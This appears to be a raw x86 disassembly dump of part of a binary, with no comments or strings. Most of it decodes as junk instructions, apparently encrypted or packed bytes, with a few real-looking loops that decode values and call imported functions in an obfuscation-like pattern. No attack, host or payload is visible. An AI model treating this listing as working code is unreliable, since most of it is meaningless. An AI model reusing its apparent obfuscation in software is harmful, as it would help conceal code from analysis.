  4020b7:	addr16 call 0x71ff:0xe7a946cf
  4020bf:	je     0x402081
  4020c1:	cmp    edx,DWORD PTR [ecx-0xc]
  4020c4:	leave  
  4020c5:	add    ch,BYTE PTR [ecx-0x561a7098]
  4020cb:	cmp    al,0x68
  4020cd:	out    0x24,al
  4020cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d0:	jbe    0x4020a0
  4020d2:	cmp    edi,edx
  4020d4:	jp     0x402078
  4020d6:	xchg   ecx,eax
  4020d7:	out    0xcf,al
  4020d9:	imul   esp,DWORD PTR [edi],0xca1eaaee
  4020df:	je     0x402101
  4020e1:	arpl   WORD PTR [ebx+edx*4+0x10],si
  4020e5:	retf   
  4020e6:	mov    gs,esp
  4020e8:	pusha  
  4020e9:	push   ebx
  4020ea:	xchg   esi,eax
  4020eb:	bt     DWORD PTR ds:0x44232f30,eax
  4020f2:	jno    0x4020fe
  4020f4:	mov    eax,0xe4dc25b3
  4020f9:	or     bl,cl
  4020fb:	iret   
  4020fc:	xor    ebp,DWORD PTR [ecx-0x77]
  4020ff:	cmp    edi,DWORD PTR [ebx-0x3c]
  402102:	sub    eax,0xb537dec0
  402107:	call   0x7cdd265b
  40210c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40210d:	ret    
  40210e:	lds    eax,FWORD PTR [esi+esi*2+0x16dfed27]
  402115:	clc    
  402116:	adc    edx,DWORD PTR [ebp+0x7e032ba1]
  40211c:	(bad)  
  40211d:	cli    
  40211e:	and    BYTE PTR [ebx+0x4dc373b],bl
  402124:	jmp    0x40219a
  402126:	cmovle esp,DWORD PTR [esi+edi*1+0x6bd7fc80]
  40212e:	dec    ebp
  40212f:	js     0x40215c
  402131:	or     eax,0xf887b73f
  402136:	lock out 0x98,eax
  402139:	mov    DWORD PTR [ecx-0x2fe4492b],ebx
  40213f:	jmp    0x4020c4
  402141:	in     al,dx
  402142:	sbb    bh,ch
  402144:	xchg   ebx,eax
  402145:	adc    al,0x4e
  402147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402148:	inc    ebp
  402149:	lahf   
  40214a:	sub    bh,ch
  40214c:	sbb    al,0xb3
  40214e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40214f:	xlat   BYTE PTR ds:[ebx]
  402150:	push   ebp
  402151:	dec    ebp
  402152:	cdq    
  402153:	pop    edx
  402154:	xchg   DWORD PTR [ecx],esp
  402156:	bound  ebp,QWORD PTR [edi+0x21]
  402159:	cmp    al,0x86
  40215b:	into   
  40215c:	out    dx,al
  40215d:	adc    al,0x18
  40215f:	inc    eax
  402160:	jno    0x4020e4
  402162:	jbe    0x4021b3
  402164:	out    dx,eax
  402165:	popa   
  402166:	dec    eax
  402167:	sbb    eax,DWORD PTR [edi+0x35]
  40216a:	pop    DWORD PTR [bx-0x7c]
  40216e:	adc    eax,0xc057c5d7
  402173:	lea    ebp,[ebp+eiz*2-0xc1db006]
  40217a:	sub    BYTE PTR [ecx+eax*2-0x4a72b5cc],0x42
  402182:	mov    ch,0x2c
  402184:	jno    0x4021f1
  402186:	inc    eax
  402187:	sar    DWORD PTR [eax],0x61
  40218a:	push   ss
  40218b:	div    BYTE PTR [ebx-0x6c]
  40218e:	and    DWORD PTR [ecx-0x7a],edi
  402191:	and    DWORD PTR ds:0xd8d992a6,edx
  402197:	inc    eax
  402198:	pushf  
  402199:	idiv   eax
  40219b:	std    
  40219c:	dec    ecx
  40219d:	into   
  40219e:	xchg   ebp,eax
  40219f:	pushf  
  4021a0:	mov    ds:0x8448b0b4,al
  4021a5:	out    dx,al
  4021a6:	sahf   
  4021a7:	xlat   BYTE PTR ds:[ebx]
  4021a8:	stos   DWORD PTR es:[edi],eax
  4021a9:	rol    BYTE PTR [eax],1
  4021ab:	pushfw 
  4021ad:	and    al,0x16
  4021af:	adc    eax,DWORD PTR [eax+ecx*1+0x15f14089]
  4021b6:	sbb    BYTE PTR [esi+0x162bfc6f],bh
  4021bc:	pop    edx
  4021bd:	push   esi
  4021be:	pop    ecx
  4021bf:	push   edx
  4021c0:	pop    ebp
  4021c1:	pop    ebp
  4021c2:	imul   edx,DWORD PTR [ecx+edi*2],0xda98e0dc
  4021c9:	inc    ecx
  4021ca:	fiadd  DWORD PTR [edx-0x64895ee9]
  4021d0:	(bad)  
  4021d1:	sub    bl,dl
  4021d3:	test   DWORD PTR ds:0xf6550705,ebx
  4021d9:	in     al,dx
  4021da:	xor    dh,0x77
  4021dd:	ror    BYTE PTR [edi+0x66f9df0b],cl
  4021e3:	jle    0x40219e
  4021e5:	lahf   
  4021e6:	ja     0x40222b
  4021e8:	int3   
  4021e9:	sub    esp,DWORD PTR [eax+0x54e9523b]
  4021ef:	pop    ds
  4021f0:	imul   ecx
  4021f2:	inc    ecx
  4021f3:	arpl   WORD PTR [ebx+0x5d],sp
  4021f6:	inc    ebp
  4021f7:	inc    ecx
  4021f8:	push   0xcc4c772f
  4021fd:	pop    ebp
  4021fe:	push   eax
  4021ff:	imul   ebp,DWORD PTR [edx],0x41
  402202:	dec    ebx
  402203:	test   BYTE PTR ds:0xeeb38099,0x4e
  40220a:	jo     0x4021de
  40220c:	das    
  40220d:	lock lods eax,DWORD PTR ds:[esi]
  40220f:	adc    eax,0x8da30a48
  402214:	test   BYTE PTR [edi],0xda
  402217:	dec    eax
  402218:	retf   
  402219:	pop    es
  40221a:	into   
  40221b:	icebp  
  40221c:	jl     0x4021f1
  40221e:	inc    eax
  40221f:	dec    edi
  402220:	pushf  
  402221:	(bad)  
  402222:	mov    eax,0xda155ee8
  402227:	add    dh,BYTE PTR [ecx-0x64cbbae9]
  40222d:	je     0x402231
  40222f:	or     BYTE PTR [edx],bl
  402231:	xchg   dh,dl
  402233:	in     al,dx
  402234:	add    al,0xc1
  402236:	rcl    BYTE PTR gs:[ebx-0x1c1765a8],1
  40223d:	sbb    dh,ah
  40223f:	int    0xde
  402241:	adc    dl,cl
  402243:	inc    eax
  402244:	inc    ebx
  402245:	mov    dh,0xa4
  402247:	mov    eax,ds:0x3c07b289
  40224c:	xchg   ecx,eax
  40224d:	jns    0x402264
  40224f:	add    eax,DWORD PTR [ebx-0x37a17da5]
  402255:	xchg   ecx,eax
  402256:	cli    
  402257:	jp     0x402240
  402259:	in     eax,0xb3
  40225b:	(bad)  
  40225c:	cmp    DWORD PTR [ecx+eax*4],ebp
  40225f:	add    ah,0x35
  402262:	adc    dh,ah
  402264:	sbb    al,BYTE PTR [ebx-0x5a]
  402267:	mov    cl,0xe6
  402269:	shl    BYTE PTR [ebx-0x27ef0dbd],0xa9
  402270:	stos   BYTE PTR es:[edi],al
  402271:	add    al,0x9a
  402273:	pushf  
  402274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402276:	jge    0x4022b6
  402278:	nop
  402279:	mov    es,WORD PTR [edi]
  40227b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40227c:	loop   0x4022ce
  40227e:	push   ebx
  40227f:	(bad)  
  402280:	rol    esi,cl
  402282:	mov    WORD PTR [eax+0x59],es
  402285:	push   edx
  402286:	pop    es
  402287:	jns    0x4022fd
  402289:	dec    ebx
  40228a:	sub    ebx,DWORD PTR [edx+edx*2+0x6f]
  40228e:	jns    0x4022f2
  402290:	jmp    0x93ffe457
  402295:	pop    esp
  402296:	addr16 jge 0x4022b0
  402299:	adc    BYTE PTR [esi],bl
  40229b:	ds jnp 0x402236
  40229e:	cmp    BYTE PTR [esi],cl
  4022a0:	cmp    ebx,DWORD PTR [ecx-0x65b8189c]
  4022a6:	nop
  4022a7:	clc    
  4022a8:	outs   dx,DWORD PTR ds:[esi]
  4022a9:	cmc    
  4022aa:	pop    es
  4022ab:	(bad)  
  4022ad:	out    0x7a,al
  4022af:	pop    esp
  4022b0:	pop    eax
  4022b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022b2:	mov    dh,0xc8
  4022b4:	mov    ds:0x8d5fdfb3,eax
  4022b9:	jmp    0xd42b:0x85a328b9
  4022c0:	out    dx,eax
  4022c1:	cmp    BYTE PTR [ebx],bl
  4022c3:	(bad)  
  4022c4:	outs   dx,BYTE PTR ds:[esi]
  4022c5:	dec    esi
  4022c6:	cmc    
  4022c7:	xor    cl,dl
  4022c9:	call   0x6650a9f2
  4022ce:	pop    esp
  4022cf:	pop    edi
  4022d0:	int3   
  4022d1:	and    DWORD PTR [ebx-0x15],0x1d3a4a79
  4022d8:	cli    
  4022d9:	leave  
  4022da:	shl    edx,1
  4022dc:	loope  0x4022fc
  4022de:	mov    esp,0x2d8d5acd
  4022e3:	mov    ecx,0x33185b8d
  4022e8:	les    ebx,FWORD PTR [eax-0x152504ac]
  4022ee:	push   0x382e9356
  4022f3:	sbb    ch,BYTE PTR [esi+0x7dbb7291]
  4022f9:	pop    edi
  4022fa:	cwde   
  4022fb:	or     al,0xae
  4022fd:	push   ds
  4022fe:	or     ecx,edx
  402300:	(bad)  
  402301:	push   ebx
  402302:	xor    DWORD PTR [ecx-0x159aa065],edi
  402308:	mov    ebp,0xe4da9741
  40230d:	pop    edi
  40230e:	pop    ss
  40230f:	fbstp  TBYTE PTR [eax+0x6d0b3afe]
  402315:	hlt    
  402316:	sbb    DWORD PTR [edx-0x24ca401e],eax
  40231c:	push   ebx
  40231d:	mov    ?,WORD PTR [esi]
  40231f:	mov    edx,0x43597631
  402324:	and    BYTE PTR [ebp+0x497e133c],bl
  40232a:	dec    eax
  40232b:	mov    ebp,cs
  40232d:	add    eax,0x2b29ce59
  402332:	push   esp
  402333:	dec    ebx
  402334:	lds    esp,FWORD PTR [esi+0x76]
  402337:	mov    edi,DWORD PTR [edx]
  402339:	out    0xe4,eax
  40233b:	inc    esp
  40233c:	mov    eax,0x4a1a2368
  402341:	sbb    bl,BYTE PTR [ebx-0x73ed3249]
  402347:	pop    ebp
  402348:	out    dx,al
  402349:	or     al,0xa5
  40234b:	ins    BYTE PTR es:[edi],dx
  40234c:	popa   
  40234d:	loopne 0x402356
  40234f:	pop    esi
  402350:	shl    BYTE PTR [ecx-0x2a],1
  402353:	jecxz  0x40238b
  402355:	(bad)  
  402356:	sti    
  402357:	push   DWORD PTR [ecx-0x73]
  40235a:	test   DWORD PTR [eax-0x1],ebp
  40235d:	(bad)  
  40235e:	inc    DWORD PTR [ebx-0x77]
  402361:	inc    ebp
  402362:	clc    
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433617,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4336fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43367b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43367b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43367b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43367b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43367b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4336bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4336f7
  4023d7:	or     DWORD PTR ds:0x433667,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433677,0x43373f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43366f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43366f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43366f,ecx
  40240a:	cmp    DWORD PTR ds:0x43366f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433810
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43366f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43366f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43366f,ecx
  402450:	cmp    DWORD PTR ds:0x43366f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx+0x87cac70]
  402480:	jmp    0x4024fd
  402482:	mov    edx,0x6f7e7e01
  402487:	jge    0x402507
  402489:	jle    0x40245d
  40248b:	psrad  mm1,QWORD PTR [ebp-0x24]
  40248f:	int    0x75
  402491:	push   ss
  402492:	jae    0x402440
  402494:	cmp    al,ch
  402496:	pop    esi
  402497:	int    0x4e
  402499:	jg     0x402490
  40249b:	in     al,dx
  40249c:	mov    eax,0x34f51187
  4024a1:	pushf  
  4024a2:	(bad)  
  4024a3:	fiadd  DWORD PTR [eax]
  4024a5:	xor    ecx,eax
  4024a7:	retf   
  4024a8:	mov    ebx,0x1c16e099
  4024ad:	call   0x13ac957
  4024b2:	aas    
  4024b3:	mov    es:0x3c67fc8f,eax
  4024b9:	loop   0x4024d8
  4024bb:	add    eax,DWORD PTR [esi]
  4024bd:	scas   eax,DWORD PTR es:[edi]
  4024be:	add    eax,0x480af8a4
  4024c3:	imul   eax,DWORD PTR [ebp+0x11],0x201428d
  4024ca:	lahf   
  4024cb:	aad    0x83
  4024cd:	(bad)  
  4024ce:	in     eax,dx
  4024cf:	mov    eax,ds:0xedf6c625
  4024d4:	jns    0x402483
  4024d6:	(bad)  
  4024d7:	fimul  DWORD PTR [eax]
  4024d9:	fcomp  QWORD PTR ds:0x80c5b17b
  4024df:	push   ebx
  4024e0:	and    eax,0x48cfc1e9
  4024e5:	retf   
  4024e6:	adc    al,bh
  4024e8:	test   eax,0x67bb92f3
  4024ed:	jmp    0x73368b91
  4024f2:	mov    ecx,0x24ec6820
  4024f7:	lds    edi,FWORD PTR [esi+0x74985d92]
  4024fd:	jae    0x402576
  4024ff:	into   
  402500:	stos   BYTE PTR es:[edi],al
  402501:	jg     0x40256c
  402503:	ja     0x4024f2
  402505:	in     al,dx
  402506:	jno    0x40256f
  402508:	scas   al,BYTE PTR es:[edi]
  402509:	mov    ebx,0xad54a313
  40250e:	nop
  40250f:	cwde   
  402510:	and    bl,bl
  402512:	test   eax,0x849f6dd8
  402517:	xlat   BYTE PTR ds:[ebx]
  402518:	icebp  
  402519:	iret   
  40251a:	and    eax,0x40861350
  40251f:	sub    eax,0x305b2619
  402524:	and    eax,0xce0f81af
  402529:	retf   
  40252a:	and    cl,BYTE PTR [ecx+0x0]
  40252d:	int3   
  40252e:	and    DWORD PTR [edx+0x18],esi
  402531:	jecxz  0x402565
  402533:	out    0xd9,eax
  402535:	or     DWORD PTR [ebx+0x12],esp
  402538:	ins    DWORD PTR es:[edi],dx
  402539:	ins    DWORD PTR es:[edi],dx
  40253a:	mov    dl,0x32
  40253c:	cmp    BYTE PTR [esi-0x7],bl
  40253f:	pop    edi
  402540:	sub    edi,DWORD PTR [ecx+0x568da588]
  402546:	adc    eax,0xe5a04f68
  40254b:	mov    ch,0xd4
  40254d:	ret    0x8ba
  402550:	ror    DWORD PTR [esp-0x62],cl
  402554:	out    0xe4,al
  402556:	je     0x4024df
  402558:	aad    0xfa
  40255a:	cld    
  40255b:	jae    0x4024f5
  40255d:	inc    eax
  40255e:	inc    ebp
  40255f:	inc    edx
  402560:	adc    edx,DWORD PTR [edx+ebx*1]
  402563:	in     al,dx
  402564:	adc    al,dl
  402566:	push   0xffffffc0
  402568:	popf   
  402569:	cmp    edx,DWORD PTR [edx-0x36]
  40256c:	xlat   BYTE PTR ds:[ebx]
  40256d:	aas    
  40256e:	and    DWORD PTR [esi],edi
  402570:	cmp    al,0xe4
  402572:	repz add al,0x5b
  402575:	sar    BYTE PTR [edi-0x57],cl
  402578:	rcl    ecx,cl
  40257a:	rcr    ecx,0x4c
  40257d:	mul    edx
  40257f:	lahf   
  402580:	adc    dl,BYTE PTR [edx+0x5f]
  402583:	xor    al,0x36
  402585:	mov    bl,0xa6
  402587:	fsub   DWORD PTR [ecx-0x6274cd46]
  40258d:	and    BYTE PTR [ebp+0x6dfee2ab],0x8b
  402594:	jg     0x40260c
  402596:	in     al,0xd1
  402598:	mov    WORD PTR [edx],gs
  40259a:	int    0x30
  40259c:	dec    esp
  40259d:	sbb    ah,BYTE PTR [eax+0x78]
  4025a0:	lods   eax,DWORD PTR ds:[esi]
  4025a1:	mov    al,ds:0x60b0374b
  4025a6:	push   0x8faa89c4
  4025ab:	inc    edi
  4025ac:	fs sub al,0x84
  4025af:	push   0xffffffbc
  4025b1:	and    al,0x6b
  4025b3:	dec    eax
  4025b4:	add    BYTE PTR [edx-0x2471fb76],dl
  4025ba:	jl     0x40254e
  4025bc:	sbb    BYTE PTR [edi+0x5fb5596a],bl
  4025c2:	adc    bh,0x90
  4025c5:	add    eax,0x677f1d71
  4025ca:	dec    esi
  4025cb:	addr16 sti 
  4025cd:	cmp    eax,0x82724e02
  4025d2:	dec    esi
  4025d3:	call   0xcc35992
  4025d8:	(bad)  
  4025d9:	mov    bl,BYTE PTR [edi-0x1eb245f1]
  4025df:	and    eax,0x9b13a7d5
  4025e4:	cmp    ebp,esi
  4025e6:	jmp    0x1042b932
  4025eb:	stos   BYTE PTR es:[edi],al
  4025ec:	test   eax,0x9cfe9f05
  4025f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025f2:	add    dl,BYTE PTR [eax]
  4025f4:	mov    ebp,0x9293bf3a
  4025f9:	sbb    eax,0x2f75bb99
  4025fe:	(bad)  
  4025ff:	and    eax,0x5a458a52
  402604:	shl    DWORD PTR [edx+0x2c3f7bef],0xb0
  40260b:	daa    
  40260c:	pop    esi
  40260d:	mov    eax,ds:0xa59b8e2a
  402612:	out    0xd7,eax
  402614:	loop   0x40262e
  402616:	(bad)  
  402618:	push   cs
  402619:	mov    al,0xc
  40261b:	inc    edi
  40261c:	cmp    al,0x2d
  40261e:	in     al,dx
  40261f:	dec    esp
  402620:	daa    
  402621:	and    esp,DWORD PTR [ebp-0x1f34a5d2]
  402627:	sub    ch,BYTE PTR [esi-0x2c]
  40262a:	sub    BYTE PTR [edx],ch
  40262c:	pop    ecx
  40262d:	shl    cl,cl
  40262f:	test   DWORD PTR [eax+ebx*2-0x636d53f3],eax
  402636:	(bad)  
  402637:	enter  0x15f9,0xda
  40263b:	mov    ebp,0x8994a54f
  402640:	jns    0x402609
  402642:	enter  0x2435,0x4f
  402646:	or     edi,edi
  402648:	into   
  402649:	lgs    ebp,FWORD PTR [ecx-0x77594e65]
  402650:	rcl    BYTE PTR [eax+0xf],cl
  402653:	in     al,0xfd
  402655:	(bad)  
  402657:	mov    ecx,0xbc1eea83
  40265c:	ins    BYTE PTR es:[edi],dx
  40265d:	jnp    0x40264b
  40265f:	(bad)  
  402660:	shr    ebx,1
  402662:	xchg   ecx,eax
  402663:	addr16 dec esi
  402665:	push   0xffffffcd
  402667:	inc    esi
  402668:	push   ss
  402669:	cwde   
  40266a:	mov    WORD PTR [edi-0x28],ss
  40266d:	(bad)  
  40266e:	cdq    
  40266f:	xchg   ebx,eax
  402670:	xlat   BYTE PTR ds:[ebx]
  402671:	cmp    ecx,edx
  402673:	sbb    DWORD PTR [edx-0x28],edx
  402676:	sbb    BYTE PTR gs:[ecx+0x19f31446],0xe
  40267e:	(bad)  
  40267f:	pop    esp
  402680:	mov    ds:0xb4766175,al
  402685:	xchg   edi,eax
  402686:	add    bl,BYTE PTR [edi+0x513bd5e8]
  40268c:	mov    esi,0xbb5ee07
  402691:	imul   ebp,DWORD PTR [esi-0x74],0x88504f2f
  402698:	hlt    
  402699:	mov    al,ds:0x69ee77c7
  40269e:	inc    esi
  40269f:	pop    esp
  4026a0:	cmp    DWORD PTR [esi+ebx*2+0x29cba4a3],esp
  4026a7:	aam    0xf5
  4026a9:	in     eax,dx
  4026aa:	jg     0x4026e2
  4026ac:	inc    esi
  4026ad:	xchg   edx,eax
  4026ae:	and    al,0xdf
  4026b0:	call   0xdf75:0x87a3addd
  4026b7:	add    ecx,ebp
  4026b9:	mov    al,ds:0xbfcf8f96
  4026be:	icebp  
  4026bf:	sahf   
  4026c0:	shl    BYTE PTR [edi+edi*8-0x3c],cl
  4026c4:	push   ss
  4026c5:	outs   dx,DWORD PTR ds:[esi]
  4026c6:	scas   eax,DWORD PTR es:[edi]
  4026c7:	xchg   edi,eax
  4026c8:	mov    ah,0x6e
  4026ca:	loope  0x40273e
  4026cc:	mov    ds:0x74404ed3,al
  4026d1:	sub    dh,bh
  4026d3:	pop    esp
  4026d4:	fwait
  4026d5:	scas   al,BYTE PTR es:[edi]
  4026d6:	inc    esi
  4026d7:	aas    
  4026d8:	sbb    esp,edi
  4026da:	das    
  4026db:	and    bl,dh
  4026dd:	call   0xc3cfbb02
  4026e2:	or     BYTE PTR [eax-0x5f],al
  4026e5:	xchg   BYTE PTR [eax+0x32],dl
  4026e8:	add    al,0xa9
  4026ea:	mov    ds:0x42108d36,eax
  4026ef:	fs inc ebp
  4026f1:	xchg   BYTE PTR [esi-0x41724353],ch
  4026f7:	add    DWORD PTR [eax+0x4702e832],0xb
  4026fe:	push   edi
  4026ff:	es in  eax,dx
  402701:	leave  
  402702:	loope  0x402783
  402704:	dec    ebx
  402705:	add    eax,0xbdf6a5aa
  40270a:	mov    al,0x55
  40270c:	cmc    
  40270d:	or     bl,ah
  40270f:	inc    esi
  402710:	sub    eax,0x32942be2
  402715:	jmp    0x40277e
  402717:	jmp    0xfddcfe43
  40271c:	inc    eax
  40271d:	mov    cl,0x42
  40271f:	sub    BYTE PTR [edx-0x16222915],bh
  402725:	pop    ds
  402726:	lods   eax,DWORD PTR ds:[esi]
  402727:	retf   
  402728:	jmp    0x402750
  40272a:	push   eax
  40272b:	xor    BYTE PTR [eax+0x7c],dl
  40272e:	mov    eax,0xab8fff0b
  402733:	mov    edx,0xc90b4167
  402738:	test   eax,0x20df756d
  40273d:	imul   eax,ebp,0x56
  402740:	mov    cl,0x43
  402742:	popa   
  402743:	fimul  WORD PTR [esi]
  402745:	enter  0x650e,0xe5
  402749:	sub    eax,0x8901ba3
  40274e:	iret   
  40274f:	pop    ebx
  402750:	neg    BYTE PTR [ecx]
  402752:	loop   0x4027a8
  402754:	jno    0x402713
  402756:	(bad)  
  402757:	out    0xb,al
  402759:	addr16 (bad) 
  40275b:	xor    al,0x3a
  40275d:	outs   dx,BYTE PTR ds:[esi]
  40275e:	mov    ecx,0xe8d01ed8
  402763:	jg     0x4027b4
  402765:	xor    al,0x4e
  402767:	sub    DWORD PTR [edx+0x12e41fee],0xffffffc6
  40276e:	test   ebp,edx
  402770:	sub    al,0xf4
  402772:	adc    esp,edx
  402774:	mov    cl,0x35
  402776:	mov    esp,0x2dd2a87c
  40277b:	js     0x402704
  40277d:	jo     0x4027f4
  40277f:	test   al,0x40
  402781:	inc    esi
  402782:	mov    ecx,0xf4fb8b51
  402787:	mov    ebx,0x3d9d59cb
  40278c:	(bad)  
  40278d:	or     dh,BYTE PTR [edx]
  40278f:	cmp    DWORD PTR [ebx+edi*1+0x29],esp
  402793:	scas   eax,DWORD PTR es:[edi]
  402794:	into   
  402795:	jns    0x4027a8
  402797:	add    DWORD PTR [ecx+edi*2-0x79d03280],ebp
  40279e:	dec    ebx
  40279f:	lea    ecx,[ebp+0x1ae605f2]
  4027a5:	xlat   BYTE PTR ds:[ebx]
  4027a6:	push   esi
  4027a7:	adc    al,0x61
  4027a9:	sar    bh,0xd6
  4027ac:	jns    0x402827
  4027ae:	repz jmp 0xd62c61ae
  4027b4:	stos   DWORD PTR es:[edi],eax
  4027b5:	ins    DWORD PTR es:[edi],dx
  4027b6:	addr16 inc edx
  4027b8:	nop
  4027b9:	mov    al,0x37
  4027bb:	dec    eax
  4027bc:	push   esp
  4027bd:	sbb    BYTE PTR ds:0x8bb4a1cc,bl
  4027c3:	pop    ss
  4027c4:	pop    ds
  4027c5:	call   0x2caea665
  4027ca:	retf   
  4027cb:	fs sbb al,0x92
  4027ce:	mov    ecx,0xea4969ff
  4027d3:	aam    0xad
  4027d5:	or     DWORD PTR [ecx+0x3d157c88],ecx
  4027db:	inc    esi
  4027dc:	ss xchg ebp,eax
  4027de:	and    eax,0xe11b61d5
  4027e3:	mov    ebx,esi
  4027e5:	dec    esi
  4027e6:	mov    edi,0xd4ec7ca1
  4027eb:	sbb    ecx,DWORD PTR [esp+edi*8+0xc92288b]
  4027f2:	jmp    0xfea42be9
  4027f7:	dec    esi
  4027f8:	mov    ah,0xcf
  4027fa:	fld    QWORD PTR [ebx]
  4027fc:	dec    ebp
  4027fd:	and    ebx,DWORD PTR [ebx-0x2b]
  402800:	aam    0xe0
  402802:	retf   
  402803:	shr    BYTE PTR [ebp*4+0x248a2f90],1
  40280a:	shl    cl,0xc9
  40280d:	lea    edx,[ebp+0x3f]
  402810:	clc    
  402811:	push   edi
  402812:	cmp    eax,0x17399f6c
  402817:	inc    ebx
  402818:	jae    0x40285e
  40281a:	sub    bl,cl
  40281c:	push   0x61
  40281e:	test   eax,0x625c8b7d
  402823:	pop    ebx
  402824:	out    dx,al
  402825:	mov    edi,0xe2f343a6
  40282a:	retf   0x73cd
  40282d:	mov    ds:0x20982483,al
  402832:	lods   eax,DWORD PTR ds:[esi]
  402833:	and    esp,DWORD PTR [edx+0x51788ea7]
  402839:	pop    edi
  40283a:	xchg   esi,eax
  40283b:	mov    eax,0x299fe80
  402840:	loop   0x4027c7
  402842:	(bad)  
  402843:	push   edx
  402844:	mov    bl,BYTE PTR [edx-0x393c1659]
  40284a:	jo     0x4028a1
  40284c:	gs mov ebp,0xd43b1c1
  402852:	aaa    
  402853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402854:	push   esp
  402855:	inc    esp
  402856:	mov    dl,0xef
  402858:	inc    edx
  402859:	mov    ecx,0x38e48b22
  40285e:	inc    ecx
  40285f:	xchg   BYTE PTR [edi-0xb1e15fc],dl
  402865:	stc    
  402866:	ss ss test al,0x27
  40286a:	sahf   
  40286b:	dec    ebp
  40286c:	jmp    0x4028d4
  40286e:	pop    edx
  40286f:	repz call 0x884:0xbccd96dc
  402877:	push   edx
  402878:	push   edx
  402879:	rcl    BYTE PTR [ebp-0x74f7be77],1
  40287f:	inc    ebp
  402880:	ror    BYTE PTR [ebx+0x4189f84d],1
  402886:	or     al,0x8b
  402888:	inc    ebp
  402889:	int3   
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx-0x21e0c115]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	stc    
  4028cf:	dec    ebx
  4028d0:	sub    ch,BYTE PTR [ebx]
  4028d2:	cmp    DWORD PTR [ebx+0x799f4688],0xbaa1b6b1
  4028dc:	sahf   
  4028dd:	mov    ebp,0x3bcc6a51
  4028e2:	(bad)  
  4028e3:	loopne 0x40293d
  4028e5:	leave  
  4028e6:	pop    esp
  4028e7:	dec    edi
  4028e8:	add    eax,DWORD PTR [eax]
  4028ea:	cld    
  4028eb:	xor    DWORD PTR ds:0x6bf8db6b,0xffffffba
  4028f2:	inc    ebx
  4028f3:	repnz mov ebx,ebp
  4028f6:	mov    BYTE PTR [esi],dl
  4028f8:	xor    BYTE PTR [ebp-0x1f],0x56
  4028fc:	add    eax,0x4ae8f82c
  402901:	inc    edi
  402902:	call   0x9611a578
  402907:	sub    dh,BYTE PTR [ecx]
  402909:	stos   DWORD PTR es:[edi],eax
  40290a:	cs dec edx
  40290c:	loope  0x40298a
  40290e:	add    ah,BYTE PTR [edx]
  402910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402912:	jmp    0x8d5eff39
